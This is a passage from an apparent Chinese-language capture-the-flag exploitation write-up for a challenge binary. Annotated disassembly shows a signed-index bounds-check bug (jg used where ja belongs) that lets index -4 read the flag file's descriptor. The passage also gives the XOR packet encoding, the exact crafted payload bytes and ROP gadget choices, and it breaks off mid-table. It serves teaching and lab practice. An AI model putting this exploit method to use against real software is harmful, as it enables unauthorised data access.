\NormalTok{401fe7:  }\ControlFlowTok{call}\NormalTok{ read}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                      }\CommentTok{; read(3, rbx, 0x100)}
\NormalTok{401fec:  }\BuiltInTok{mov}  \KeywordTok{rcx}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401fef:  }\BuiltInTok{cmp}  \KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x3}
\NormalTok{401ff3:  }\ControlFlowTok{jle}  \DecValTok{402080}                        \CommentTok{; 太短 → "ERR no response"}
\NormalTok{401ff9:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x3061}\OperatorTok{]}              \CommentTok{; key}
\NormalTok{401fff:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{402002:  }\BuiltInTok{mov}  \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rbx}
\NormalTok{402005:  }\ControlFlowTok{call} \BaseNTok{0x401be0}                      \CommentTok{; 解密}
\NormalTok{40200a:  }\BuiltInTok{movsx} \KeywordTok{dx}\OperatorTok{,} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x11}\OperatorTok{]}      \CommentTok{; 標頭 byte1}
\NormalTok{402010:  }\BuiltInTok{movsx} \KeywordTok{ax}\OperatorTok{,} \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x12}\OperatorTok{]}      \CommentTok{; 標頭 byte2}
\NormalTok{402016:  }\BuiltInTok{shl}   \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x8}
\NormalTok{402019:  }\BuiltInTok{or}    \KeywordTok{edx}\OperatorTok{,}\KeywordTok{eax}                      \CommentTok{; dx = big{-}endian 的 16{-}bit 長度}
\NormalTok{40201b:  }\BuiltInTok{cmp}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x10}\OperatorTok{],}\BaseNTok{0x0}       \CommentTok{; 標頭 byte0 必須是 0}
\NormalTok{402020:  }\ControlFlowTok{jne}  \DecValTok{402041}
\NormalTok{402022:  }\BuiltInTok{test} \KeywordTok{dx}\OperatorTok{,}\KeywordTok{dx}
\NormalTok{402025:  }\ControlFlowTok{je}   \DecValTok{402041}                        \CommentTok{; 長度 0 → 不印}
\NormalTok{402027:  }\BuiltInTok{sub}  \KeywordTok{ecx}\OperatorTok{,}\BaseNTok{0x4}
\NormalTok{40202a:  }\BuiltInTok{cmp}  \KeywordTok{cx}\OperatorTok{,}\KeywordTok{dx}
\NormalTok{40202d:  }\ControlFlowTok{jb}   \DecValTok{402041}                        \CommentTok{; 收到的資料不夠 → 不印}
\NormalTok{40202f:  }\BuiltInTok{movzx} \KeywordTok{edx}\OperatorTok{,}\KeywordTok{dx}
\NormalTok{402032:  }\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x14}\OperatorTok{]}                \CommentTok{; payload 起點}
\NormalTok{402037:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{40203c:  }\ControlFlowTok{call}\NormalTok{ write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                     }\CommentTok{; write(1, payload, len)  ← 印出 flag！}
\end{Highlighting}
\end{Shaded}

注意兩件事：

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \texttt{RELAY} 送的標頭\textbf{長度永遠是 0}：\texttt{0x401fb2} 有一條
  \texttt{xor\ \allowbreak{}eax,\allowbreak{}eax}（把 \texttt{rax} 整個歸零）， 接著
  \texttt{0x401fbe} 的 \texttt{mov\ \allowbreak{}WORD\ \allowbreak{}PTR\ \allowbreak{}{[}rsp+0xd{]},\allowbreak{}ax}
  就把標頭 byte1\textasciitilde byte2 寫成 \texttt{0x0000}， 而
  \texttt{0x401fb4} 把 byte3（pad）寫成 0。 → 我們\textbf{沒有辦法}用
  \texttt{RELAY} 送「帶 payload 的封包」給保險箱，只能送 4 bytes
  空標頭。
\item
  \texttt{RELAY} 讀回覆之後會\textbf{解密、檢查、印出 payload} ------
  這是我們要利用的「印表機」。
\end{enumerate}

\paragraph{\texorpdfstring{3.7 XOR
加解密（\texttt{0x401be0}）}{3.7 XOR 加解密（0x401be0）}}\label{xor-ux52a0ux89e3ux5bc60x401be0}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401be0:  }\BuiltInTok{mov}  \KeywordTok{eax}\OperatorTok{,}\KeywordTok{edx}
\NormalTok{401be2:  }\BuiltInTok{bswap} \KeywordTok{edx}
\NormalTok{401be4:  }\BuiltInTok{mov}  \DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{{-}}\BaseNTok{0x4}\OperatorTok{],}\KeywordTok{edx}     \CommentTok{; [rsp{-}4]=key[3], [rsp{-}3]=key[2], ...}
\NormalTok{401be8:  }\BuiltInTok{shr}  \KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x18}                    \CommentTok{; al = key 的最高 byte = key[3]}
\NormalTok{401beb:  }\BuiltInTok{test} \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rsi}
\NormalTok{401bee:  }\ControlFlowTok{je}   \DecValTok{401}\ErrorTok{c17}
\NormalTok{401bf0:  }\BuiltInTok{xor}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdi}\OperatorTok{],}\KeywordTok{al}           \CommentTok{; buf[0] \^{}= key[3]}
\NormalTok{401bf2:  }\BuiltInTok{mov}  \KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{401bf7:  }\BuiltInTok{cmp}  \KeywordTok{rsi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{401bfb:  }\ControlFlowTok{je}   \DecValTok{401}\ErrorTok{c17}
\NormalTok{401c00:  }\BuiltInTok{mov}  \KeywordTok{rdx}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401c03:  }\BuiltInTok{and}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x3}
\NormalTok{401c06:  }\BuiltInTok{movzx} \KeywordTok{edx}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\KeywordTok{rdx}\OperatorTok{*}\DecValTok{1}\OperatorTok{{-}}\BaseNTok{0x4}\OperatorTok{]}
\NormalTok{401c0b:  }\BuiltInTok{xor}  \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdi}\OperatorTok{+}\KeywordTok{rax}\OperatorTok{*}\DecValTok{1}\OperatorTok{],}\KeywordTok{dl}     \CommentTok{; buf[i] \^{}= ks[i \& 3]}
\NormalTok{401c0e:  }\BuiltInTok{add}  \KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{401c12:  }\BuiltInTok{cmp}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401c15:  }\ControlFlowTok{jne}  \DecValTok{401}\ErrorTok{c00}
\NormalTok{401c17:  }\ControlFlowTok{ret}
\end{Highlighting}
\end{Shaded}

推出來的 keystream：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
ks[0] = key[3]
ks[1] = key[2]
ks[2] = key[1]
ks[3] = key[0]
ks[i] = key[3 - (i & 3)]
\end{Verbatim}

也就是 \textbf{key 的 4 個 byte 反過來輪流用}。 用 Python 表示就是：

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ xor\_key(data, key):          }\CommentTok{\# key 是 4 bytes 的原始 bytes}
\NormalTok{    ks }\OperatorTok{=}\NormalTok{ key[::}\OperatorTok{{-}}\DecValTok{1}\NormalTok{]}
    \ControlFlowTok{return} \BuiltInTok{bytes}\NormalTok{(c }\OperatorTok{\^{}}\NormalTok{ ks[i }\OperatorTok{\%} \DecValTok{4}\NormalTok{] }\ControlFlowTok{for}\NormalTok{ i, c }\KeywordTok{in} \BuiltInTok{enumerate}\NormalTok{(data))}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{4. 保險箱（子行程）端 ---
漏洞在這裡}\label{ux4fddux96aaux7bb1ux5b50ux884cux7a0bux7aef-ux6f0fux6d1eux5728ux9019ux88e1}

保險箱的程式碼在 \texttt{0x401769} 之後。

\paragraph{4.1 開場：把 flag 的 fd 存進「fd
槽表」}\label{ux958bux5834ux628a-flag-ux7684-fd-ux5b58ux9032fd-ux69fdux8868}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{40178e:  }\BuiltInTok{lea}  \KeywordTok{rbp}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x18da}\OperatorTok{]}        \CommentTok{; rbp = 0x40306f = "/dev/null"}
\NormalTok{401795:  }\BuiltInTok{mov}  \KeywordTok{esi}\OperatorTok{,}\BaseNTok{0x2}                 \CommentTok{; O\_RDWR}
\NormalTok{40179a:  }\BuiltInTok{xor}  \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}                 \CommentTok{; varargs 的「向量參數個數」= 0}
\NormalTok{40179c:  }\BuiltInTok{mov}  \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rbp}                 \CommentTok{; ✶ 0x40179c 是這一條（別把 open 的斷點下在這）}
\NormalTok{40179f:  }\ControlFlowTok{call}\NormalTok{ open}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                }\CommentTok{; 開 /dev/null  ← 要斷在 open 請用 \textasciigrave{}b *0x40179f\textasciigrave{}}
\NormalTok{4017a4:  }\BuiltInTok{xor}  \KeywordTok{esi}\OperatorTok{,}\KeywordTok{esi}
\NormalTok{4017a8:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{4017aa:  }\ControlFlowTok{call}\NormalTok{ dup2}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                }\CommentTok{; dup2(devnull, 0)}
\NormalTok{4017b1:  }\BuiltInTok{mov}  \KeywordTok{esi}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{4017bd:  }\ControlFlowTok{call}\NormalTok{ dup2}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                }\CommentTok{; dup2(devnull, 1)}
\NormalTok{4017c2:  }\BuiltInTok{mov}  \KeywordTok{esi}\OperatorTok{,}\BaseNTok{0x1}                 \CommentTok{; signal(SIGPIPE, SIG\_IGN)}
\NormalTok{4017c7:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\BaseNTok{0xd}
\NormalTok{4017d3:  }\ControlFlowTok{call}\NormalTok{ signal}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}
\NormalTok{4017da:  }\BuiltInTok{lea}  \KeywordTok{rdi}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x1898}\OperatorTok{]}        \CommentTok{; 0x403079 = "flag.txt"}
\NormalTok{4017e3:  }\ControlFlowTok{call}\NormalTok{ open}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}
\NormalTok{4017e8:  }\BuiltInTok{mov}  \DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x388e}\OperatorTok{],}\BaseNTok{0x2}      \CommentTok{; [0x405080] = 2   (state)}
\NormalTok{4017f2:  }\BuiltInTok{mov}  \DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x388c}\OperatorTok{],}\KeywordTok{eax}      \CommentTok{; [0x405084] = fd}
\NormalTok{4017f8:  (迴圈，注意引數是 rbp}\OperatorTok{)}\NormalTok{  再開 }\DecValTok{3}\NormalTok{ 次 }\OperatorTok{/}\NormalTok{dev}\OperatorTok{/}\NormalTok{null 放進 }\BaseNTok{0x40548c} \OperatorTok{/} \BaseNTok{0x405898} \OperatorTok{/} \BaseNTok{0x405ca4}
                                  \CommentTok{; rdi 由 0x4017fa 的 \textasciigrave{}mov rdi,rbp\textasciigrave{} 決定，而 rbp = 0x40306f = "/dev/null"}
\end{Highlighting}
\end{Shaded}

所以：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x405080  { int state = 2 ; int fd = <flag.txt 的 fd> }     ← fd 槽 #0（唯一的 flag fd）
0x40548c  { int state = 2 ; int fd = <devnull 的 fd> }      ← fd 槽 #1
0x405898  { int state = 2 ; int fd = <devnull 的 fd> }      ← fd 槽 #2
0x405ca4  { int state = 2 ; int fd = <devnull 的 fd> }      ← fd 槽 #3（迴圈多跑一次寫的）
\end{Verbatim}

（槽的大小是
\texttt{0x40c}。\texttt{r12\ \allowbreak{}=\ \allowbreak{}0x405080\ \allowbreak{}+\ \allowbreak{}3*0x40c\ \allowbreak{}=\ \allowbreak{}0x405ca4}
是迴圈的\textbf{比較值}，
但比較是在\textbf{寫槽之後}才做（\texttt{0x401806\ \allowbreak{}mov\ \allowbreak{}{[}rbx{]},\allowbreak{}2} →
\texttt{0x40180c\ \allowbreak{}call\ \allowbreak{}open} → \texttt{0x401814\ \allowbreak{}cmp\ \allowbreak{}rbx,\allowbreak{}r12}）， 所以
\texttt{0x405ca4} 這一個槽也會被寫入 \texttt{state\ \allowbreak{}=\ \allowbreak{}2} 才跳出 → fd
槽共 \textbf{4 個}。）

\begin{quote}
※注意 \textbf{別以為「負更多格就能打到別的 flag fd」}：只有
\texttt{0x405080}（slot \#0）是 \texttt{flag.\allowbreak{}txt} 的 fd， 另外 3
個槽開的都是 \texttt{/\allowbreak{}dev/\allowbreak{}null} ------ 迴圈裡的 \texttt{open} 用的引數是
\texttt{rbp\ \allowbreak{}=\ \allowbreak{}0x40306f\ \allowbreak{}=\ \allowbreak{}"/\allowbreak{}dev/\allowbreak{}null"}， 而
\texttt{0x403079\ \allowbreak{}=\ \allowbreak{}"flag.\allowbreak{}txt"} 只是第一次 \texttt{open}
用的常數，\textbf{沒有被迴圈重用}。 而且 \texttt{index\ \allowbreak{}=\ \allowbreak{}-\allowbreak{}8} 會打到
\texttt{0x404050}、\texttt{index\ \allowbreak{}=\ \allowbreak{}-\allowbreak{}12} 會打到 \texttt{0x403020}，
那兩格都不是槽（用 \texttt{0x4060b0\ \allowbreak{}+\ \allowbreak{}index*0x40c}
自己算一次就知道）。
\end{quote}

\paragraph{4.2 儲存槽表（slot
table）}\label{ux5132ux5b58ux69fdux8868slot-table}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{40182b:  }\BuiltInTok{lea}  \KeywordTok{rbx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x487e}\OperatorTok{]}        \CommentTok{; rbx = 0x4060b0  ← 槽表基底}
\end{Highlighting}
\end{Shaded}

每個槽 \texttt{0x40c} bytes：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
+0x000   int   state      (0 = 空, 1 = 有資料, 2 = fd 槽)
+0x004   int   fd         (state == 2 時使用)
+0x008   u16   size       (state == 1 時使用)
+0x00c   ...   data (最多 0x400 bytes)
\end{Verbatim}

\paragraph{4.3 主迴圈}\label{ux4e3bux8ff4ux5708}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401839:  }\BuiltInTok{mov}  \KeywordTok{rdx}\OperatorTok{,}\KeywordTok{r14}        \CommentTok{; r14 = rsp+0x16  (放 len)}
\NormalTok{40183c:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rbp}        \CommentTok{; rbp = rsp+0x420 (payload 緩衝區)}
\NormalTok{40183f:  }\BuiltInTok{mov}  \KeywordTok{rdi}\OperatorTok{,}\KeywordTok{r13}        \CommentTok{; r13 = rsp+0x15  (放 op)}
\NormalTok{401842:  }\ControlFlowTok{call} \BaseNTok{0x401c40}       \CommentTok{; 讀一個封包（含解密）}
\NormalTok{401847:  }\BuiltInTok{mov}\NormalTok{  r12d}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{40184a:  }\BuiltInTok{test} \KeywordTok{eax}\OperatorTok{,}\KeywordTok{eax}
\NormalTok{40184c:  }\ControlFlowTok{jne}  \DecValTok{401}\ErrorTok{a0e}         \CommentTok{; 失敗 → \_exit(0)}
\NormalTok{401852:  }\BuiltInTok{movzx} \KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x15}\OperatorTok{]}   \CommentTok{; op}
\end{Highlighting}
\end{Shaded}

分派：

\begin{itemize}
\tightlist
\item
  \texttt{op\ \allowbreak{}==\ \allowbreak{}1} → \texttt{0x40196a}：回傳 2 bytes（\texttt{"OK"}）
\item
  \texttt{op\ \allowbreak{}==\ \allowbreak{}2} →
  \texttt{0x401875}：\textbf{新增槽}。\texttt{{[}0x405064{]}} 是計數器，
  \texttt{cmp\ \allowbreak{}r8d,\allowbreak{}0xf\ \allowbreak{}/\allowbreak{}\ \allowbreak{}jg} → 最多 16 個；把 payload 複製進槽（最多
  \texttt{0x400}）， 然後回 4 bytes（新槽的 index）。
\item
  \texttt{op\ \allowbreak{}==\ \allowbreak{}3} → \texttt{0x4019c0}：\textbf{讀槽} ← 我們的目標
\item
  \texttt{op\ \allowbreak{}==\ \allowbreak{}4} → \texttt{0x401982}：回傳槽的統計字串
\item
  其他 → 錯誤
\end{itemize}

\paragraph{\texorpdfstring{4.4 ★ \texttt{op\ \allowbreak{}==\ \allowbreak{}3}
的漏洞}{4.4 ★ op == 3 的漏洞}}\label{op-3-ux7684ux6f0fux6d1e}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{4019c0:  }\BuiltInTok{cmp}  \DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x16}\OperatorTok{],}\BaseNTok{0x3}    \CommentTok{; len 必須 \textgreater{} 3}
\NormalTok{4019c6:  }\ControlFlowTok{jbe}   \DecValTok{401}\ErrorTok{a89}                    \CommentTok{; 否則 "short"}
\NormalTok{4019cc:  }\BuiltInTok{movsxd} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x420}\OperatorTok{]} \CommentTok{; ✶ index = (int32) payload[0:4]  ← 有號數！}
\NormalTok{4019d4:  }\BuiltInTok{cmp}  \KeywordTok{eax}\OperatorTok{,}\BaseNTok{0xf}
\NormalTok{4019d7:  }\ControlFlowTok{jg}   \DecValTok{401}\ErrorTok{a6e}                     \CommentTok{; ✶ 只擋「大於 15」，沒擋負數}
\NormalTok{4019dd:  }\BuiltInTok{imul} \KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x40c}
\NormalTok{4019e4:  }\BuiltInTok{add}  \KeywordTok{rax}\OperatorTok{,}\KeywordTok{rbx}                    \CommentTok{; 槽位址 = 0x4060b0 + index*0x40c}
\NormalTok{4019e7:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{]}        \CommentTok{; state}
\NormalTok{4019e9:  }\BuiltInTok{cmp}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x1}
\NormalTok{4019ec:  }\ControlFlowTok{je}   \DecValTok{401}\ErrorTok{a5a}                     \CommentTok{; state==1 → 回傳槽裡的資料}
\NormalTok{4019ee:  }\BuiltInTok{cmp}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x2}
\NormalTok{4019f1:  }\ControlFlowTok{je}   \DecValTok{401}\ErrorTok{a24}                     \CommentTok{; state==2 → 走 fd 分支}
\NormalTok{4019f3:  ... "empty}\StringTok{"}
\end{Highlighting}
\end{Shaded}

\texttt{state\ \allowbreak{}==\ \allowbreak{}2} 的分支：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{401a24:  }\BuiltInTok{mov}  \KeywordTok{edi}\OperatorTok{,}\DataTypeTok{DWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x4}\OperatorTok{]}    \CommentTok{; fd = 槽的 fd 欄位}
\NormalTok{401a27:  }\BuiltInTok{lea}  \KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x20}\OperatorTok{]}             \CommentTok{; buf}
\NormalTok{401a2c:  }\BuiltInTok{xor}  \KeywordTok{ecx}\OperatorTok{,}\KeywordTok{ecx}
\NormalTok{401a2e:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\BaseNTok{0x400}
\NormalTok{401a33:  }\ControlFlowTok{call}\NormalTok{ pread}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt                  }\CommentTok{; pread(fd, buf, 0x400, 0)}
\NormalTok{401a3d:  }\BuiltInTok{test} \KeywordTok{rax}\OperatorTok{,}\KeywordTok{rax}
\NormalTok{401a40:  }\ControlFlowTok{jle}  \DecValTok{401}\ErrorTok{a46}
\NormalTok{401a42:  }\BuiltInTok{movzx}\NormalTok{ r12d}\OperatorTok{,}\KeywordTok{ax}
\NormalTok{401a46:  }\BuiltInTok{mov}  \KeywordTok{rsi}\OperatorTok{,[}\KeywordTok{rsp}\OperatorTok{+}\BaseNTok{0x8}\OperatorTok{]}
\NormalTok{401a4b:  }\BuiltInTok{mov}  \KeywordTok{edx}\OperatorTok{,}\NormalTok{r12d}
\NormalTok{401a4e:  }\BuiltInTok{xor}  \KeywordTok{edi}\OperatorTok{,}\KeywordTok{edi}
\NormalTok{401a50:  }\ControlFlowTok{call} \BaseNTok{0x401d50}                   \CommentTok{; 送 \{op=0, payload=buf, len=rax\} 回前台}
\end{Highlighting}
\end{Shaded}

\textbf{漏洞：\texttt{index} 是有號 32-bit，但只用 \texttt{jg}（signed
greater）擋上界。}

取 \texttt{index\ \allowbreak{}=\ \allowbreak{}-\allowbreak{}4}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
0x4060b0 + (-4) * 0x40c
 = 0x4060b0 - 0x1030
 = 0x405080            ← 正好是 fd 槽 #0，state = 2，fd = flag.txt
\end{Verbatim}

於是保險箱就自己幫我們 \texttt{pread(flag\_\allowbreak{}fd,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}0x400,\allowbreak{}\ \allowbreak{}0)}，
然後把內容送回前台。※完成

\begin{quote}
※提示 \textbf{教學重點：\texttt{ja} vs \texttt{jg}} * \texttt{ja}（jump
if above）→ \textbf{無號}比較 * \texttt{jg}（jump if greater）→
\textbf{有號}比較

編譯器把 \texttt{unsigned\ \allowbreak{}idx} 的邊界檢查編成 \texttt{ja}，
\texttt{int\ \allowbreak{}idx} 編成 \texttt{jg}。只要程式設計師用了「有號」型別，
負索引就會穿過 \texttt{idx\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}15} 的檢查。這類 bug
在真實世界很常見。
\end{quote}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{5.
通訊協定（封包格式）}\label{ux901aux8a0aux5354ux5b9aux5c01ux5305ux683cux5f0f}

\paragraph{5.1 標頭（4
bytes，加密前）}\label{ux6a19ux982d4-bytesux52a0ux5bc6ux524d}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
byte 0 : op
byte 1 : len_hi      ┐ 大端 16-bit 長度
byte 2 : len_lo      ┘
byte 3 : pad (0)
\end{Verbatim}

發送端（\texttt{0x401d50}）會組出這個標頭、加密、\texttt{write(3,\allowbreak{}\ \allowbreak{}header,\allowbreak{}\ \allowbreak{}4)}，
如果 \texttt{len\ \allowbreak{}!=\ \allowbreak{}0} 再把 payload 加密後送出。

接收端（\texttt{0x401c40}）讀 4 bytes、解密、取
\texttt{op\ \allowbreak{}=\ \allowbreak{}b{[}0{]}}、
\texttt{len\ \allowbreak{}=\ \allowbreak{}(b{[}1{]}\ \allowbreak{}\textless{}\allowbreak{}\textless{}\allowbreak{}\ \allowbreak{}8)\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}b{[}2{]}}（\textbf{大端}）、檢查
\texttt{len\ \allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}0x1000} 就報錯， 然後讀 \texttt{len}
bytes、解密。

\begin{quote}
※注意 \textbf{大端陷阱}：pwntools 的 \texttt{p16(x)} 產生的是
\textbf{little-endian}。 這裡必須自己寫
\texttt{b\textquotesingle{}\allowbreak{}\textbackslash{}\allowbreak{}x00\textbackslash{}\allowbreak{}x04\textquotesingle{}\allowbreak{}}
代表長度 4，不能用 \texttt{p16(4)}。 我第一次寫錯，保險箱就會讀到
\texttt{len\ \allowbreak{}=\ \allowbreak{}0x0400\ \allowbreak{}=\ \allowbreak{}1024} 然後永遠等資料。
\end{quote}

\paragraph{5.2
我們要送的封包}\label{ux6211ux5011ux8981ux9001ux7684ux5c01ux5305}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
op   = 3                (讀槽)
len  = 4                (payload 4 bytes)
pad  = 0
payload = int32(-4) = 0xfffffffc   (little-endian: fc ff ff ff)
\end{Verbatim}

加密前共 8 bytes：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
03 00 04 00 | fc ff ff ff
\end{Verbatim}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{6. 難點：怎麼把封包送進 fd
3？}\label{ux96e3ux9edeux600eux9ebcux628aux5c01ux5305ux9001ux9032-fd-3}

\begin{itemize}
\item
  \texttt{RELAY} 只送 \texttt{len\ \allowbreak{}=\ \allowbreak{}0} 的標頭 → 沒辦法送 payload。
\item
  那用 ROP 呼叫 \texttt{read(3,\allowbreak{}\ \allowbreak{}buf,\allowbreak{}\ \allowbreak{}n)} 呢？

  \textbf{不行}，因為我們\textbf{沒有辦法設定
  \texttt{rdx}}：這支程式裡沒有任何 \texttt{pop\ \allowbreak{}rdx} gadget
  （\texttt{objdump\ \allowbreak{}-\allowbreak{}d\ \allowbreak{}-\allowbreak{}M\ \allowbreak{}intel\ \allowbreak{}service\ \allowbreak{}\textbar{}\allowbreak{}\ \allowbreak{}grep\ \allowbreak{}\textquotesingle{}\allowbreak{}pop\ \allowbreak{}\ \allowbreak{}\ \allowbreak{}\ \allowbreak{}rdx\textquotesingle{}\allowbreak{}}
  沒有輸出，
  \texttt{ROP(e).\allowbreak{}find\_\allowbreak{}gadget({[}\textquotesingle{}\allowbreak{}pop\ \allowbreak{}rdx\textquotesingle{}\allowbreak{},\allowbreak{}\textquotesingle{}\allowbreak{}ret\textquotesingle{}\allowbreak{}{]})}
  也回傳 \texttt{None}）， 所以只能改用「binary 裡面自己會設定
  \texttt{edx} 的程式碼片段」當 gadget。 （順帶一提：glibc 的
  \texttt{read}/\texttt{write} wrapper 本身\textbf{不會}動
  \texttt{rdx}， 它動的是 \texttt{rdi}（\texttt{movsxd\ \allowbreak{}rdi,\allowbreak{}edi}）與
  \texttt{rcx}/\texttt{r8}/\texttt{r9}（被 \texttt{xor} 歸零）；
  不要以為 wrapper 會幫你把 \texttt{rdx} 弄壞。）
\end{itemize}

我挑的三個片段（都在函式中段，位址剛好可以用）：

{\def\LTcaptype{none} % do not increment counter
\begin{longtable}[]{@{}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}
  >{\raggedright\arraybackslash}p{(\linewidth - 4\tabcolsep) * \real{0.3333}}@{}}
\toprule\noalign{}
\begin{minipage}[b]{\linewidth}\raggedright
位址
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
內容
\end{minipage} & \begin{minipage}[b]{\linewidth}\raggedright
效果
\end{minipage} \\
\midrule\noalign{}
\endhead
\bottomrule\noalign{}
\endlastfoot
\texttt{0x401f07} &
\texttt{xor\ \allowbreak{}edi,\allowbreak{}edi;\ \allowbreak{}movzx\ \allowbreak{}edx,\allowbreak{}bl;\ \allowbreak{}mov\ \allowbreak{}rsi,\allowbreak{}rsp;\ \allowbreak{}call\ \allowbreak{}read} &
\texttt{read(0,\allowbreak{}\ \allowbreak{}rsp,\allowbreak{}\ \allowbreak{}bl)} \\
\texttt{0x401fda} &
\texttt{mov\ \allowbreak{}edx,\allowbreak{}0x100;\ \allowbreak{}mov\ \allowbreak{}rsi,\allowbreak{}rbx;\ \allowbreak{}mov\ \allowbreak{}edi,\allowbreak{}3;\ \allowbreak{}call\ \allowbreak{}read} &
\texttt{read(3,\allowbreak{}\ \allowbreak{}rbx,\allowbreak{}\ \allowbreak{}0x100)} \\
